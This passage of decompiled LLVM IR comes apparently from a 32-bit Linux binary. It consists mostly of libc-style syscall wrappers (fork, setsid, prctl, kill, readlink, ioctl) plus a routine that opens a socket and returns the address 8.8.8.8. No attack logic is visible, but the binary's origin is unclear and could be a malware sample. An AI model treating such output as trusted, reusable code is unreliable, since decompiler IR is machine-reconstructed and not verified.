  %v0_804f8b5 = phi i32 [ %v2_804f8b03, %dec_label_pc_804f8a2 ], [ 0, %dec_label_pc_804f894 ]
  %v0_804f8a3 = phi i32 [ %v1_804f8a3, %dec_label_pc_804f8a2 ], [ 1, %dec_label_pc_804f894 ]
  %v3_804f8ac = add i32 %v2_804f8ac, %v0_804f8a3
  %v4_804f8ac = inttoptr i32 %v3_804f8ac to i8*
  %v5_804f8ac = load i8, i8* %v4_804f8ac, align 1
  %v4_804f8b0 = add i32 %v0_804f8b5, %tmp8
  %v5_804f8b0 = inttoptr i32 %v4_804f8b0 to i8*
  %v6_804f8b0 = load i8, i8* %v5_804f8b0, align 1
  %v17_804f8b0 = icmp eq i8 %v5_804f8ac, %v6_804f8b0
  %v1_804f8b3 = icmp eq i1 %v17_804f8b0, false
  br i1 %v1_804f8b3, label %dec_label_pc_804f8a0, label %dec_label_pc_804f8b5

dec_label_pc_804f8b5:                             ; preds = %dec_label_pc_804f8a8
  %v1_804f8b5 = add i32 %v0_804f8b5, 1
  %v12_804f8b6 = icmp eq i32 %tmp9, %v1_804f8b5
  %v1_804f8b8 = icmp eq i1 %v12_804f8b6, false
  br i1 %v1_804f8b8, label %dec_label_pc_804f8a2, label %dec_label_pc_804f88a

; uselistorder directives
  uselistorder i32 %v0_804f8a3, { 2, 0, 1 }
  uselistorder i32 %v0_804f8b5, { 1, 0 }
  uselistorder i32 %v1_804f8a2, { 1, 0 }
  uselistorder i32 %tmp10, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f88a, { 1, 0, 2 }
}

define i32 @function_804fa30() local_unnamed_addr {
dec_label_pc_804fa30:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 16, i32* %stack_var_-12, align 4
  %v1_804fa3d = call i32 @function_805021b(i32 16)
  %v1_804fa42 = inttoptr i32 %v1_804fa3d to i32*
  store i32 0, i32* %v1_804fa42, align 4
  %v4_804fa4f = call i32 @function_80504f2(i32 2, i32 2, i32 0, i32 %v1_804fa3d)
  store i32 %v4_804fa4f, i32* %esi.global-to-local, align 4
  %v10_804fa5b = icmp eq i32 %v4_804fa4f, -1
  br i1 %v10_804fa5b, label %dec_label_pc_804faa2, label %dec_label_pc_804fa60

dec_label_pc_804fa60:                             ; preds = %dec_label_pc_804fa30
  %v2_804fa60 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804fa60, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-28, align 4
  %v3_804fa7f = call i32 @function_8050317(i32 %v4_804fa4f, i32 %v2_804fa60, i32 16)
  %v2_804fa87 = ptrtoint i32* %stack_var_-12 to i32
  %v0_804fa8d = load i32, i32* %esi.global-to-local, align 4
  %v3_804fa8e = call i32 @function_8050342(i32 %v0_804fa8d, i32 %v2_804fa60, i32 %v2_804fa87)
  %v1_804fa96 = call i32 @function_804fce3(i32 %v0_804fa8d)
  br label %dec_label_pc_804faa2

dec_label_pc_804faa2:                             ; preds = %dec_label_pc_804fa30, %dec_label_pc_804fa60
  %v0_804faa7 = phi i32 [ 0, %dec_label_pc_804fa30 ], [ 134744072, %dec_label_pc_804fa60 ]
  ret i32 %v0_804faa7

; uselistorder directives
  uselistorder i32 %v4_804fa4f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_8050317, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_80504f2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804faa2, { 1, 0 }
}

define i32 @function_804fc4d(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804fc4d:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804fc4d = load i32, i32* @edi, align 4
  %v0_804fc4e = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804fc62 = add i32 %arg2, -12
  store i32 %arg3, i32* @edx, align 4
  %v6_804fc6c = icmp ugt i32 %v1_804fc62, 2
  br i1 %v6_804fc6c, label %dec_label_pc_804fc7c, label %dec_label_pc_804fc6e

dec_label_pc_804fc6e:                             ; preds = %dec_label_pc_804fc4d
  %v4_804fc72 = call i32 @function_804fca4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_804fc62)
  br label %dec_label_pc_804fc9e

dec_label_pc_804fc7c:                             ; preds = %dec_label_pc_804fc4d
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804fc84 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_804fc84, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_804fc84, -4095
  br i1 %tmp17, label %dec_label_pc_804fc9c, label %dec_label_pc_804fc90

dec_label_pc_804fc90:                             ; preds = %dec_label_pc_804fc7c
  %v1_804fc90 = call i32 @function_805021b(i32 %v0_804fc4e)
  %v0_804fc95 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fc95 = sub i32 0, %v0_804fc95
  %v2_804fc97 = inttoptr i32 %v1_804fc90 to i32*
  store i32 %v1_804fc95, i32* %v2_804fc97, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fc9c

dec_label_pc_804fc9c:                             ; preds = %dec_label_pc_804fc7c, %dec_label_pc_804fc90
  %v0_804fc9c = phi i32 [ %v2_804fc84, %dec_label_pc_804fc7c ], [ -1, %dec_label_pc_804fc90 ]
  br label %dec_label_pc_804fc9e

dec_label_pc_804fc9e:                             ; preds = %dec_label_pc_804fc6e, %dec_label_pc_804fc9c
  %v0_804fca3 = phi i32 [ %v4_804fc72, %dec_label_pc_804fc6e ], [ %v0_804fc9c, %dec_label_pc_804fc9c ]
  store i32 %v0_804fc4e, i32* @ebx, align 4
  store i32 %v0_804fc4d, i32* @edi, align 4
  ret i32 %v0_804fca3

; uselistorder directives
  uselistorder i32 %v2_804fc84, { 1, 0, 2 }
  uselistorder i32 %v0_804fc4e, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804fc9e, { 1, 0 }
  uselistorder label %dec_label_pc_804fc9c, { 1, 0 }
}

define i32 @function_804fca4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804fca4:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fca4 = load i32, i32* @edi, align 4
  store i32 %v0_804fca4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_804fcbc = load i32, i32* @ebx, align 4
  %v1_804fcc4 = call i32 @int80_syscall(i32 221)
  store i32 %v1_804fcc4, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_804fcc4, -4095
  br i1 %tmp12, label %dec_label_pc_804fcdc, label %dec_label_pc_804fcd0

dec_label_pc_804fcd0:                             ; preds = %dec_label_pc_804fca4
  %v1_804fcd0 = call i32 @function_805021b(i32 %v0_804fcbc)
  %v0_804fcd5 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fcd5 = sub i32 0, %v0_804fcd5
  %v2_804fcd7 = inttoptr i32 %v1_804fcd0 to i32*
  store i32 %v1_804fcd5, i32* %v2_804fcd7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804fce1.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fcdc

dec_label_pc_804fcdc:                             ; preds = %dec_label_pc_804fca4, %dec_label_pc_804fcd0
  %v2_804fce1 = phi i32 [ %v0_804fca4, %dec_label_pc_804fca4 ], [ %v2_804fce1.pre, %dec_label_pc_804fcd0 ]
  %v0_804fcdc = phi i32 [ %v1_804fcc4, %dec_label_pc_804fca4 ], [ -1, %dec_label_pc_804fcd0 ]
  store i32 %v2_804fce1, i32* %edi.global-to-local, align 4
  ret i32 %v0_804fcdc

; uselistorder directives
  uselistorder i32 %v1_804fcc4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fcdc, { 1, 0 }
}

define i32 @function_804fce3(i32 %arg1) local_unnamed_addr {
dec_label_pc_804fce3:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fce3 = load i32, i32* @edi, align 4
  store i32 %v0_804fce3, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804fceb = load i32, i32* @ebx, align 4
  %v1_804fcf3 = call i32 @close(i32 %arg1)
  store i32 %v0_804fceb, i32* @ebx, align 4
  store i32 %v1_804fcf3, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_804fcf3, -4095
  br i1 %tmp9, label %dec_label_pc_804fd0b, label %dec_label_pc_804fcff

dec_label_pc_804fcff:                             ; preds = %dec_label_pc_804fce3
  %v1_804fcff = call i32 @function_805021b(i32 %v0_804fceb)
  %v0_804fd04 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fd04 = sub i32 0, %v0_804fd04
  %v2_804fd06 = inttoptr i32 %v1_804fcff to i32*
  store i32 %v1_804fd04, i32* %v2_804fd06, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804fd0f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fd0b

dec_label_pc_804fd0b:                             ; preds = %dec_label_pc_804fce3, %dec_label_pc_804fcff
  %v2_804fd0f = phi i32 [ %v0_804fce3, %dec_label_pc_804fce3 ], [ %v2_804fd0f.pre, %dec_label_pc_804fcff ]
  %v0_804fd0b = phi i32 [ %v1_804fcf3, %dec_label_pc_804fce3 ], [ -1, %dec_label_pc_804fcff ]
  store i32 %v2_804fd0f, i32* @edi, align 4
  ret i32 %v0_804fd0b

; uselistorder directives
  uselistorder i32 %v1_804fcf3, { 1, 0, 2 }
  uselistorder i32 %v0_804fceb, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fd0b, { 1, 0 }
}

define i32 @function_804fd11() local_unnamed_addr {
dec_label_pc_804fd11:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fd11 = load i32, i32* @ebx, align 4
  store i32 %v0_804fd11, i32* %stack_var_-4, align 4
  %v1_804fd1a = call i32 @fork(i32 %v0_804fd11)
  store i32 %v1_804fd1a, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_804fd1a, -4095
  br i1 %tmp7, label %dec_label_pc_804fd31, label %dec_label_pc_804fd25

dec_label_pc_804fd25:                             ; preds = %dec_label_pc_804fd11
  %v1_804fd25 = call i32 @function_805021b(i32 %v0_804fd11)
  %v0_804fd2a = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fd2a = sub i32 0, %v0_804fd2a
  %v2_804fd2c = inttoptr i32 %v1_804fd25 to i32*
  store i32 %v1_804fd2a, i32* %v2_804fd2c, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804fd35.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fd31

dec_label_pc_804fd31:                             ; preds = %dec_label_pc_804fd11, %dec_label_pc_804fd25
  %v2_804fd35 = phi i32 [ %v0_804fd11, %dec_label_pc_804fd11 ], [ %v2_804fd35.pre, %dec_label_pc_804fd25 ]
  %v0_804fd31 = phi i32 [ %v1_804fd1a, %dec_label_pc_804fd11 ], [ -1, %dec_label_pc_804fd25 ]
  store i32 %v2_804fd35, i32* @ebx, align 4
  ret i32 %v0_804fd31

; uselistorder directives
  uselistorder i32 %v1_804fd1a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fd31, { 1, 0 }
}

define i32 @function_804fd37() local_unnamed_addr {
dec_label_pc_804fd37:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fd37 = load i32, i32* @ebx, align 4
  store i32 %v0_804fd37, i32* %stack_var_-4, align 4
  %v1_804fd40 = call i32 @getpid(i32 %v0_804fd37)
  store i32 %v1_804fd40, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_804fd40, -4095
  br i1 %tmp7, label %dec_label_pc_804fd57, label %dec_label_pc_804fd4b

dec_label_pc_804fd4b:                             ; preds = %dec_label_pc_804fd37
  %v1_804fd4b = call i32 @function_805021b(i32 %v0_804fd37)
  %v0_804fd50 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fd50 = sub i32 0, %v0_804fd50
  %v2_804fd52 = inttoptr i32 %v1_804fd4b to i32*
  store i32 %v1_804fd50, i32* %v2_804fd52, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804fd5b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fd57

dec_label_pc_804fd57:                             ; preds = %dec_label_pc_804fd37, %dec_label_pc_804fd4b
  %v2_804fd5b = phi i32 [ %v0_804fd37, %dec_label_pc_804fd37 ], [ %v2_804fd5b.pre, %dec_label_pc_804fd4b ]
  %v0_804fd57 = phi i32 [ %v1_804fd40, %dec_label_pc_804fd37 ], [ -1, %dec_label_pc_804fd4b ]
  %v2_804fd59 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fd59, i32* @edx, align 4
  store i32 %v2_804fd5b, i32* @ebx, align 4
  ret i32 %v0_804fd57

; uselistorder directives
  uselistorder i32 %v1_804fd40, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fd57, { 1, 0 }
}

define i32 @function_804fd5d() local_unnamed_addr {
dec_label_pc_804fd5d:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fd5d = load i32, i32* @ebx, align 4
  store i32 %v0_804fd5d, i32* %stack_var_-4, align 4
  %v1_804fd66 = call i32 @getppid(i32 %v0_804fd5d)
  store i32 %v1_804fd66, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_804fd66, -4095
  br i1 %tmp7, label %dec_label_pc_804fd7d, label %dec_label_pc_804fd71

dec_label_pc_804fd71:                             ; preds = %dec_label_pc_804fd5d
  %v1_804fd71 = call i32 @function_805021b(i32 %v0_804fd5d)
  %v0_804fd76 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fd76 = sub i32 0, %v0_804fd76
  %v2_804fd78 = inttoptr i32 %v1_804fd71 to i32*
  store i32 %v1_804fd76, i32* %v2_804fd78, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804fd81.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fd7d

dec_label_pc_804fd7d:                             ; preds = %dec_label_pc_804fd5d, %dec_label_pc_804fd71
  %v2_804fd81 = phi i32 [ %v0_804fd5d, %dec_label_pc_804fd5d ], [ %v2_804fd81.pre, %dec_label_pc_804fd71 ]
  %v0_804fd7d = phi i32 [ %v1_804fd66, %dec_label_pc_804fd5d ], [ -1, %dec_label_pc_804fd71 ]
  store i32 %v2_804fd81, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804fd7d

; uselistorder directives
  uselistorder i32 %v1_804fd66, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fd7d, { 1, 0 }
}

define i32 @function_804fd83(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804fd83:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fd83 = load i32, i32* @edi, align 4
  store i32 %v0_804fd83, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804fd9b = load i32, i32* @ebx, align 4
  %v2_804fda3 = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v2_804fda3, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v2_804fda3, -4095
  br i1 %tmp12, label %dec_label_pc_804fdbb, label %dec_label_pc_804fdaf

dec_label_pc_804fdaf:                             ; preds = %dec_label_pc_804fd83
  %v1_804fdaf = call i32 @function_805021b(i32 %v0_804fd9b)
  %v0_804fdb4 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fdb4 = sub i32 0, %v0_804fdb4
  %v2_804fdb6 = inttoptr i32 %v1_804fdaf to i32*
  store i32 %v1_804fdb4, i32* %v2_804fdb6, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804fdc0.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fdbb

dec_label_pc_804fdbb:                             ; preds = %dec_label_pc_804fd83, %dec_label_pc_804fdaf
  %v2_804fdc0 = phi i32 [ %v0_804fd83, %dec_label_pc_804fd83 ], [ %v2_804fdc0.pre, %dec_label_pc_804fdaf ]
  %v0_804fdbb = phi i32 [ %v2_804fda3, %dec_label_pc_804fd83 ], [ -1, %dec_label_pc_804fdaf ]
  store i32 %v2_804fdc0, i32* %edi.global-to-local, align 4
  ret i32 %v0_804fdbb

; uselistorder directives
  uselistorder i32 %v2_804fda3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fdbb, { 1, 0 }
}

define i32 @function_804fdc2(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804fdc2:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fdc2 = load i32, i32* @ebx, align 4
  store i32 %v0_804fdc2, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804fdd5 = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_804fdd5, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_804fdd5, -4095
  br i1 %tmp9, label %dec_label_pc_804fdee, label %dec_label_pc_804fde2

dec_label_pc_804fde2:                             ; preds = %dec_label_pc_804fdc2
  %v1_804fde2 = call i32 @function_805021b(i32 %v0_804fdc2)
  %v0_804fde7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fde7 = sub i32 0, %v0_804fde7
  %v2_804fde9 = inttoptr i32 %v1_804fde2 to i32*
  store i32 %v1_804fde7, i32* %v2_804fde9, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804fdf2.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fdee

dec_label_pc_804fdee:                             ; preds = %dec_label_pc_804fdc2, %dec_label_pc_804fde2
  %v2_804fdf2 = phi i32 [ %v0_804fdc2, %dec_label_pc_804fdc2 ], [ %v2_804fdf2.pre, %dec_label_pc_804fde2 ]
  %v0_804fdee = phi i32 [ %v2_804fdd5, %dec_label_pc_804fdc2 ], [ -1, %dec_label_pc_804fde2 ]
  %v2_804fdf0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fdf0, i32* @edx, align 4
  store i32 %v2_804fdf2, i32* @ebx, align 4
  ret i32 %v0_804fdee

; uselistorder directives
  uselistorder i32 %v2_804fdd5, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fdee, { 1, 0 }
}

define i32 @function_804fdf4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804fdf4:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804fdf5 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_804fdfb = sdiv i32 %sext, 16777216
  %v4_804fdff = ptrtoint i8* %arg1 to i32
  %v3_804fe03 = and i32 %arg2, 64
  %v4_804fe03 = icmp eq i32 %v3_804fe03, 0
  br i1 %v4_804fe03, label %dec_label_pc_804fe14, label %dec_label_pc_804fe08

dec_label_pc_804fe08:                             ; preds = %dec_label_pc_804fdf4
  br label %dec_label_pc_804fe14

dec_label_pc_804fe14:                             ; preds = %dec_label_pc_804fdf4, %dec_label_pc_804fe08
  store i32 %v4_804fdff, i32* %ebx.global-to-local, align 4
  %v5_804fe1f = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_804fdfb)
  store i32 %v5_804fe1f, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_804fe1f, -4095
  br i1 %tmp15, label %dec_label_pc_804fe37, label %dec_label_pc_804fe2b

dec_label_pc_804fe2b:                             ; preds = %dec_label_pc_804fe14
  %v1_804fe2b = call i32 @function_805021b(i32 %v0_804fdf5)
  %v0_804fe30 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fe30 = sub i32 0, %v0_804fe30
  %v2_804fe32 = inttoptr i32 %v1_804fe2b to i32*
  store i32 %v1_804fe30, i32* %v2_804fe32, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fe37

dec_label_pc_804fe37:                             ; preds = %dec_label_pc_804fe14, %dec_label_pc_804fe2b
  %v0_804fe37 = phi i32 [ %v5_804fe1f, %dec_label_pc_804fe14 ], [ -1, %dec_label_pc_804fe2b ]
  store i32 %v0_804fdf5, i32* @ebx, align 4
  ret i32 %v0_804fe37

; uselistorder directives
  uselistorder i32 %v5_804fe1f, { 1, 0, 2 }
  uselistorder i32 %v0_804fdf5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804fe37, { 1, 0 }
  uselistorder label %dec_label_pc_804fe14, { 1, 0 }
}

define i32 @function_804fe3f(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804fe3f:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804fe40 = load i32, i32* @esi, align 4
  store i32 %v0_804fe40, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804fe58 = load i32, i32* @ebx, align 4
  %v5_804fe60 = call i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5)
  store i32 %v5_804fe60, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v5_804fe60, -4095
  br i1 %tmp12, label %dec_label_pc_804fe78, label %dec_label_pc_804fe6c

dec_label_pc_804fe6c:                             ; preds = %dec_label_pc_804fe3f
  %v1_804fe6c = call i32 @function_805021b(i32 %v0_804fe58)
  %v0_804fe71 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fe71 = sub i32 0, %v0_804fe71
  %v2_804fe73 = inttoptr i32 %v1_804fe6c to i32*
  store i32 %v1_804fe71, i32* %v2_804fe73, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_804fe7b.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804fe78

dec_label_pc_804fe78:                             ; preds = %dec_label_pc_804fe3f, %dec_label_pc_804fe6c
  %v2_804fe7b = phi i32 [ %v0_804fe40, %dec_label_pc_804fe3f ], [ %v2_804fe7b.pre, %dec_label_pc_804fe6c ]
  %v0_804fe78 = phi i32 [ %v5_804fe60, %dec_label_pc_804fe3f ], [ -1, %dec_label_pc_804fe6c ]
  store i32 %v2_804fe7b, i32* %esi.global-to-local, align 4
  ret i32 %v0_804fe78

; uselistorder directives
  uselistorder i32 %v5_804fe60, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fe78, { 1, 0 }
}

define i32 @function_804fe7e(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804fe7e:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fe7e = load i32, i32* @edi, align 4
  store i32 %v0_804fe7e, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804fe8e = load i32, i32* @ebx, align 4
  %v4_804fe96 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_804fe96, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_804fe96, -4095
  br i1 %tmp12, label %dec_label_pc_804feae, label %dec_label_pc_804fea2

dec_label_pc_804fea2:                             ; preds = %dec_label_pc_804fe7e
  %v1_804fea2 = call i32 @function_805021b(i32 %v0_804fe8e)
  %v0_804fea7 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fea7 = sub i32 0, %v0_804fea7
  %v2_804fea9 = inttoptr i32 %v1_804fea2 to i32*
  store i32 %v1_804fea7, i32* %v2_804fea9, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804feb2.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804feae

dec_label_pc_804feae:                             ; preds = %dec_label_pc_804fe7e, %dec_label_pc_804fea2
  %v2_804feb2 = phi i32 [ %v0_804fe7e, %dec_label_pc_804fe7e ], [ %v2_804feb2.pre, %dec_label_pc_804fea2 ]
  %v0_804feae = phi i32 [ %v4_804fe96, %dec_label_pc_804fe7e ], [ -1, %dec_label_pc_804fea2 ]
  store i32 %v2_804feb2, i32* %edi.global-to-local, align 4
  ret i32 %v0_804feae

; uselistorder directives
  uselistorder i32 %v4_804fe96, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804feae, { 1, 0 }
}

define i32 @function_804feb4(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804feb4:
  %edi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg2 to i8*
  %stack_var_-4 = alloca i32, align 4
  %v0_804feb4 = load i32, i32* @edi, align 4
  store i32 %v0_804feb4, i32* %stack_var_-4, align 4
  %v4_804feb8 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804feb8, i32* %edi.global-to-local, align 4
  %v0_804fec4 = load i32, i32* @ebx, align 4
  %v7_804fecc = call i32 @readlink(i8* %arg1, i8* %tmp5, i32 %arg3)
  store i32 %v7_804fecc, i32* %edi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_804fecc, -4095
  br i1 %tmp13, label %dec_label_pc_804fee4, label %dec_label_pc_804fed8

dec_label_pc_804fed8:                             ; preds = %dec_label_pc_804feb4
  %v1_804fed8 = call i32 @function_805021b(i32 %v0_804fec4)
  %v0_804fedd = load i32, i32* %edi.global-to-local, align 4
  %v1_804fedd = sub i32 0, %v0_804fedd
  %v2_804fedf = inttoptr i32 %v1_804fed8 to i32*
  store i32 %v1_804fedd, i32* %v2_804fedf, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804fee8.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fee4

dec_label_pc_804fee4:                             ; preds = %dec_label_pc_804feb4, %dec_label_pc_804fed8
  %v2_804fee8 = phi i32 [ %v0_804feb4, %dec_label_pc_804feb4 ], [ %v2_804fee8.pre, %dec_label_pc_804fed8 ]
  %v0_804fee4 = phi i32 [ %v7_804fecc, %dec_label_pc_804feb4 ], [ -1, %dec_label_pc_804fed8 ]
  store i32 %v2_804fee8, i32* %edi.global-to-local, align 4
  ret i32 %v0_804fee4

; uselistorder directives
  uselistorder i32 %v7_804fecc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fee4, { 1, 0 }
}

define i32 @function_804feea() local_unnamed_addr {
dec_label_pc_804feea:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804feeb = load i32, i32* @esi, align 4
  store i32 %v0_804feeb, i32* %stack_var_-8, align 4
  %v0_804ff03 = load i32, i32* @ebx, align 4
  %v1_804ff0b = call i32 @int80_syscall(i32 142)
  store i32 %v0_804ff03, i32* @ebx, align 4
  store i32 %v1_804ff0b, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_804ff0b, -4095
  br i1 %tmp12, label %dec_label_pc_804ff23, label %dec_label_pc_804ff17

dec_label_pc_804ff17:                             ; preds = %dec_label_pc_804feea
  %v1_804ff17 = call i32 @function_805021b(i32 %v0_804ff03)
  %v0_804ff1c = load i32, i32* %esi.global-to-local, align 4
  %v1_804ff1c = sub i32 0, %v0_804ff1c
  %v2_804ff1e = inttoptr i32 %v1_804ff17 to i32*
  store i32 %v1_804ff1c, i32* %v2_804ff1e, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_804ff26.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804ff23

dec_label_pc_804ff23:                             ; preds = %dec_label_pc_804feea, %dec_label_pc_804ff17
  %v2_804ff26 = phi i32 [ %v0_804feeb, %dec_label_pc_804feea ], [ %v2_804ff26.pre, %dec_label_pc_804ff17 ]
  %v0_804ff23 = phi i32 [ %v1_804ff0b, %dec_label_pc_804feea ], [ -1, %dec_label_pc_804ff17 ]
  store i32 %v2_804ff26, i32* @esi, align 4
  ret i32 %v0_804ff23

; uselistorder directives
  uselistorder i32 %v1_804ff0b, { 1, 0, 2 }
  uselistorder i32 %v0_804ff03, { 1, 0 }
  uselistorder label %dec_label_pc_804ff23, { 1, 0 }
}

define i32 @function_804ff29() local_unnamed_addr {
dec_label_pc_804ff29:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ff29 = load i32, i32* @ebx, align 4
  store i32 %v0_804ff29, i32* %stack_var_-4, align 4
  %v1_804ff32 = call i32 @setsid(i32 %v0_804ff29)
  store i32 %v1_804ff32, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_804ff32, -4095
  br i1 %tmp7, label %dec_label_pc_804ff49, label %dec_label_pc_804ff3d

dec_label_pc_804ff3d:                             ; preds = %dec_label_pc_804ff29
  %v1_804ff3d = call i32 @function_805021b(i32 %v0_804ff29)
